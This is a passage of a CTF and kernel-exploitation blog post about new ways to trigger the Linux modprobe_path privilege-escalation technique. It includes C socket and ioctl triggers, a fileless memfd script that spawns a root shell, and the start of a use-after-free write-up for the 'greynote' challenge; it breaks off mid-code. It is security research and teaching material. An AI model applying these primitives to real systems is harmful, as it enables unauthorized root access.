+    <div class="post-meta"><span title='2026-07-03 16:00:00'>July 3, 2026</span>&nbsp;·&nbsp;leo_something &amp; BitFriends&nbsp;·&nbsp;<span id="gc-907cdece55b3a43d6ab174d01f20ddb0">0</span>&nbsp;views
+
+<script>
+    (function() {
+        var path = "/posts/docs/socket020---reviving-modprobe_path-again/";
+        var tid = "gc-907cdece55b3a43d6ab174d01f20ddb0";
+        var r = new XMLHttpRequest();
+        r.onreadystatechange = function() {
+            if (r.readyState === 4 && r.status === 200) {
+                try {
+                    var res = JSON.parse(r.responseText);
+                    var el = document.getElementById(tid);
+                    if (el && res.count) {
+                        el.innerText = res.count.replace(/\s/g, '');
+                    } else if (el) {
+                        el.innerText = '0';
+                    }
+                } catch (e) {
+                    console.error("GoatCounter JSON error", e);
+                }
+            }
+        };
+        r.open('GET', 'https://leo1.goatcounter.com/counter/' + encodeURIComponent(path) + '.json', true);
+        r.send();
+    })();
+</script>
+
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/kpwn" class="custom-tag">
+        kpwn
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#tldr" aria-label="TL;DR">TL;DR</a></li>
+                <li>
+                    <a href="#af_alg-path" aria-label="AF_ALG path">AF_ALG path</a></li>
+                <li>
+                    <a href="#finding-a-new-way-to-trigger-modprobe" aria-label="Finding a new way to trigger modprobe">Finding a new way to trigger modprobe</a><ul>
+                        
+                <li>
+                    <a href="#part-one---manual-digging-in-linux-source" aria-label="Part one - manual digging in Linux source">Part one - manual digging in Linux source</a></li>
+                <li>
+                    <a href="#part-two---finding-more-paths-with-ai--codeql" aria-label="Part two - finding more paths with AI &#43; CodeQL">Part two - finding more paths with AI + CodeQL</a><ul>
+                        
+                <li>
+                    <a href="#_af_inet_" aria-label="AF_INET">AF_INET</a></li>
+                <li>
+                    <a href="#_af_inet6_" aria-label="AF_INET6">AF_INET6</a></li>
+                <li>
+                    <a href="#_af_netlink_" aria-label="AF_NETLINK">AF_NETLINK</a></li>
+                <li>
+                    <a href="#_af_unspec_-the-best-one" aria-label="AF_UNSPEC (the best one)">AF_UNSPEC (the best one)</a></li>
+                <li>
+                    <a href="#_more-paths_" aria-label="More paths">More paths</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bonus---fileless-with-memfd" aria-label="Bonus - fileless with memfd">Bonus - fileless with memfd</a></li></ul>
+                </li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#example-challenge" aria-label="Example challenge">Example challenge</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#gathering-information" aria-label="Gathering information">Gathering information</a></li>
+                <li>
+                    <a href="#testing-our-assumptions" aria-label="Testing our assumptions">Testing our assumptions</a></li>
+                <li>
+                    <a href="#getting-a-kernel-text-leak" aria-label="Getting a kernel .text leak">Getting a kernel .text leak</a></li>
+                <li>
+                    <a href="#corrupting-modprobe_path" aria-label="Corrupting modprobe_path">Corrupting modprobe_path</a></li>
+                <li>
+                    <a href="#win" aria-label="Win">Win</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<p>The <code>modprobe_path</code> technique is a widely known Linux kernel exploitation primitive that can be used to turn an arbitrary write primitive into LPE.</p>
+<h3 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h3>
+<p><code>modprobe_path</code> is a string that specifies the name of the modprobe executable in the Linux kernel. This program is responsible for adding and removing loadable kernel modules.</p>
+<p>When <code>CONFIG_STATIC_USERMODEHELPER</code> is disabled <code>modprobe_path</code>is R/W, this means that if we have an arbitrary write primitive and a KASLR leak, we can change it to a controlled executable file path.
+If we now find a way to make the kernel run modprobe for us, it will run our executable with root privileges, thus achieving LPE.</p>
+<p>Modprobe used to be triggerable by executing a file with unknown magic bytes, as I explained <a href="https://leo1.cc/posts/docs/modprobe/">here</a>, but this has not been possible for a while.</p>
+<h3 id="af_alg-path">AF_ALG path<a hidden class="anchor" aria-hidden="true" href="#af_alg-path">#</a></h3>
+<p>After the path above became unreachable, <a href="https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch">this great blogpost</a> came out, proposing a new way to trigger modprobe using the <code>AF_ALG</code> cryptography socket.
+Unfortunately this method is not universal, as this socket can be disabled, furthermore, it will be <a href="https://www.phoronix.com/news/Linux-7.2-Crypto">deprecated</a> with the 7.2 kernel release, due to its &ldquo;massive attack surface&rdquo;.</p>
+<h3 id="finding-a-new-way-to-trigger-modprobe">Finding a new way to trigger modprobe<a hidden class="anchor" aria-hidden="true" href="#finding-a-new-way-to-trigger-modprobe">#</a></h3>
+<p>In this blogpost we will use a CTF challenge as a demo to show the more interesting paths we&rsquo;ve found, which are simpler and with less constraints compared to <code>AF_ALG</code>.</p>
+<p>Modprobe gets called by the kernel using <code>call_modprobe</code>, which is only called by <a href="https://elixir.bootlin.com/linux/v7.0.10/source/kernel/module/kmod.c"><code>__request_module</code></a>, this is a kernel function that is called when requesting to load a new kernel module.</p>
+<p>To summarize, if you can call <code>__request_module</code> and control <code>modprobe_path</code>, you are guaranteed LPE.</p>
+<h4 id="part-one---manual-digging-in-linux-source">Part one - manual digging in Linux source<a hidden class="anchor" aria-hidden="true" href="#part-one---manual-digging-in-linux-source">#</a></h4>
+<p>While solving the CTF challenge we needed to be fast at finding a path (without AI).
+For that we visited the <a href="https://elixir.bootlin.com/linux/v7.0.10/source/">Linux kernel source tree</a> of version v7.0.10 to check references to <code>request_module</code>. The first logical idea is to look at commonly used source files/features.</p>
+<p>We started with <code>net/socket.c</code>, since sockets are an extremely fundamental concept of Linux. It didn&rsquo;t take long until we found <a href="">this</a> interesting snippet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> SIOCGIFVLAN:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> SIOCSIFVLAN:
+</span></span><span style="display:flex;"><span>			err <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>ENOPKG;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vlan_ioctl_hook)
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">request_module</span>(<span style="color:#e6db74">&#34;8021q&#34;</span>);
+</span></span></code></pre></div><p>This <code>ioctl</code> request on a socket file descriptor almost instantly calls <code>request_module</code>, as long as <code>vlan_ioctl_hook</code> is not set (which wasn&rsquo;t for this specific challenge).
+Another interesting and convenient thing is that the two cases are not guarded/disableable - except, of course, if sockets are disabled entirely. This made it a perfect candidate for this challenge, which could also be used for many other tasks.</p>
+<p>The setup itself is also pretty simple, and in fact much less complex than the <code>AF_ALG</code> path.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> sfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(sfd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;socket&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(sfd, SIOCSIFVLAN, NULL);
+</span></span></code></pre></div><p>It can be verified in GDB that this code snippet successfully triggers <code>__request_module</code>. See the <a href="#example-challenge">example challenge</a> on how we used this in the exploit.</p>
+<h4 id="part-two---finding-more-paths-with-ai--codeql">Part two - finding more paths with AI + CodeQL<a hidden class="anchor" aria-hidden="true" href="#part-two---finding-more-paths-with-ai--codeql">#</a></h4>
+<p>After the CTF ended we could finally use AI to find better paths more quickly.
+As it turns out, Codex with GPT-5.5 is pretty good at using CodeQL (thanks to the <a href="https://kqx.io">kqx</a> guys for the tip), so with some basic setup and good prompts we were able to discover and manually validate at least 4 new paths to trigger <code>__request_module</code> with as few constraints as possible.</p>
+<p>The base constraints for all approaches are some extremely basic kernel config flags. They should be pretty much always enabled by default:</p>
+<pre tabindex="0"><code>CONFIG_MODULES=y
+CONFIG_NET=y
+</code></pre><p>The most interesting paths we&rsquo;ve found and validated are the following:</p>
+<h5 id="_af_inet_"><em>AF_INET</em><a hidden class="anchor" aria-hidden="true" href="#_af_inet_">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_SCTP 132
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
+</span></span></code></pre></div><p>This requires <code>CONFIG_INET=y</code>.</p>
+<h5 id="_af_inet6_"><em>AF_INET6</em><a hidden class="anchor" aria-hidden="true" href="#_af_inet6_">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_SCTP 132
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
+</span></span></code></pre></div><p>This requires <code>CONFIG_INET=y</code> and <code>CONFIG_IPV6=y</code>.</p>
+<h5 id="_af_netlink_"><em>AF_NETLINK</em><a hidden class="anchor" aria-hidden="true" href="#_af_netlink_">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define NETLINK_CRYPTO 21
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_NETLINK, SOCK_RAW, NETLINK_CRYPTO);
+</span></span></code></pre></div><p>This requires <code>CONFIG_CRYPTO_USER=m/y</code>.</p>
+<h5 id="_af_unspec_-the-best-one"><em>AF_UNSPEC</em> (the best one)<a hidden class="anchor" aria-hidden="true" href="#_af_unspec_-the-best-one">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNSPEC, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>This last approach doesn&rsquo;t require any additional kernel config flags, which makes it the most short and universal approach to trigger modprobe.</p>
+<h5 id="_more-paths_"><em>More paths</em><a hidden class="anchor" aria-hidden="true" href="#_more-paths_">#</a></h5>
+<p>GPT-5.5 + CodeQL found also other paths, but we didn&rsquo;t validate all of them because they required configs/capabilities that are not usually enabled by default (e.g bluetooth, CAN, etc).</p>
+<h4 id="bonus---fileless-with-memfd">Bonus - fileless with memfd<a hidden class="anchor" aria-hidden="true" href="#bonus---fileless-with-memfd">#</a></h4>
+<p>As shown in <a href="https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch">V4bel&rsquo;s blogpost</a>, modprobe can be triggered also if you don&rsquo;t have the permissions/you don&rsquo;t want to create any file.
+This can be done using <code>memfd</code> to &ldquo;store the file&rdquo; in memory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define MODPROBE_SCRIPT \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &#34;#!/bin/sh\n&#34; \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &#34;exec /bin/sh -i &lt;/proc/%u/fd/%u &gt;/proc/%u/fd/%u 2&gt;&amp;1\n&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> fake_modprobe[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pid_t</span> pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpid</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> modprobe_script_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">memfd_create</span>(<span style="color:#e6db74">&#34;&#34;</span>, MFD_CLOEXEC);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> shell_stdin_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">dup</span>(STDIN_FILENO);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> shell_stdout_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">dup</span>(STDOUT_FILENO);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dprintf</span>(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">snprintf</span>(fake_modprobe, <span style="color:#66d9ef">sizeof</span>(fake_modprobe), <span style="color:#e6db74">&#34;/proc/%i/fd/%i&#34;</span>, pid, modprobe_script_fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// change modprobe_path to fake_modprobe
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>); <span style="color:#75715e">// trigger modprobe with AF_UNSPEC
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">9999</span>); <span style="color:#75715e">// keep the process alive to interact with /bin/sh
+</span></span></span></code></pre></div><h1 id="example-challenge">Example challenge<a hidden class="anchor" aria-hidden="true" href="#example-challenge">#</a></h1>
+<p>The challenge &ldquo;greynote&rdquo; was part of GreyCTF Finals 2026. We played this CTF as ARESx team and managed to get first blood with our newly found techniques. It was definitely cool to refrain from using AI during this competition, and come up with something novel.</p>
+<p>The challenge is a simple Linux kernel module that allows to mess with a newly created slab. We got all basic functionalities including allocating, freeing, editing and viewing chunks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">gn_ioctl</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> op, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> user_data)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> ret; <span style="color:#75715e">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> ptr; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> note_ptr; <span style="color:#75715e">// rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> idx; <span style="color:#75715e">// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> len; <span style="color:#75715e">// [rsp+8h] [rbp-28h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> content; <span style="color:#75715e">// [rsp+10h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> guard; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  guard <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readgsqword</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>_ref_stack_chk_guard);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span>(op) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xC0186712</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">copy_from_user</span>(a1: <span style="color:#f92672">&amp;</span>idx, a2: user_data, a3: <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xFFF</span> <span style="color:#f92672">||</span> len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x400</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mutex_lock</span>(a1: <span style="color:#f92672">&amp;</span>note_lock);
+</span></span><span style="display:flex;"><span>      note_ptr <span style="color:#f92672">=</span> notes[idx];
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( note_ptr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( len <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>(<span style="color:#66d9ef">__int64</span>)(<span style="color:#a6e22e">copy_from_user</span>(a1: note_ptr, a2: content, a3: len) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFF2LL</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> unlock_ret;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BUG</span>();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> unlock_ret;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xC0186713</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">copy_from_user</span>(a1: <span style="color:#f92672">&amp;</span>idx, a2: user_data, a3: <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xFFF</span> <span style="color:#f92672">||</span> len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x400</span> )
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">mutex_lock</span>(a1: <span style="color:#f92672">&amp;</span>note_lock);
+</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> ( notes[idx] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>	  {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ( len <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>		  ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>(<span style="color:#66d9ef">__int64</span>)(<span style="color:#a6e22e">copy_to_user</span>(a1: content) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFF2LL</span>;
+</span></span><span style="display:flex;"><span>	unlock_ret:
+</span></span><span style="display:flex;"><span>		  <span style="color:#a6e22e">mutex_unlock</span>(a1: <span style="color:#f92672">&amp;</span>note_lock);
+</span></span><span style="display:flex;"><span>		  <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">BUG</span>();
+</span></span><span style="display:flex;"><span>	  }
+</span></span><span style="display:flex;"><span>	  ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> unlock_ret;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x40086710</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( user_data <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFFF</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EEXIST;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mutex_lock</span>(a1: <span style="color:#f92672">&amp;</span>note_lock);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( notes[user_data] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmem_cache_alloc_noprof</span>(a1: note_cache, a2: <span style="color:#ae81ff">3520</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( ptr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          notes[user_data] <span style="color:#f92672">=</span> ptr;
+</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> unlock_ret;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x40086711</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( user_data <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFFF</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mutex_lock</span>(a1: <span style="color:#f92672">&amp;</span>note_lock);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( notes[user_data] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kmem_cache_free</span>(a1: note_cache);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> unlock_ret;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOTTY;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It is pretty obvious that there is a <strong>use-after-free</strong> here, since after <code>kmem_cache_free</code> the pointer never gets zero&rsquo;ed out. Okay, let&rsquo;s verify some points first before starting with the exploit.</p>
+<h3 id="gathering-information">Gathering information<a hidden class="anchor" aria-hidden="true" href="#gathering-information">#</a></h3>
+<p>The <code>greynote</code> cache is created in <code>init_module()</code> the following way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>note_cache <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmem_cache_create</span>(<span style="color:#e6db74">&#34;greynote&#34;</span>, <span style="color:#ae81ff">1024</span>, SLAB_HWCACHE_ALIGN);
+</span></span></code></pre></div><p>Which is, to our luck, pretty standard, and without painful additional cache flags.</p>
+<p>For the kernel config and the allocator, we can notice some interesting things:</p>
+<pre tabindex="0"><code>----- Allocator -----
+Allocator                               : Unknown
+----- Other -----
+CONFIG_STATIC_USERMODEHELPER            : Disabled (call_usermodehelper_setup uses dynamic path)
+</code></pre><p>The allocator in this kernel version is apparently not supported in <a href="https://github.com/bata24/gef">GDB bata</a>, which makes it kind of painful to debug. Also notice that <code>modprobe_path</code> has R/W permissions, this is very important.</p>
+<p>Back to the exploitation part: to summarize, we got a UAF in a custom slab. This means we have to perform a cross cache attack of some sort.</p>
+<h3 id="testing-our-assumptions">Testing our assumptions<a hidden class="anchor" aria-hidden="true" href="#testing-our-assumptions">#</a></h3>
+<p>Lets first start by verifying our UAF. We will just read the contents of some chunks after we&rsquo;ve free&rsquo;d them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/greynote&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
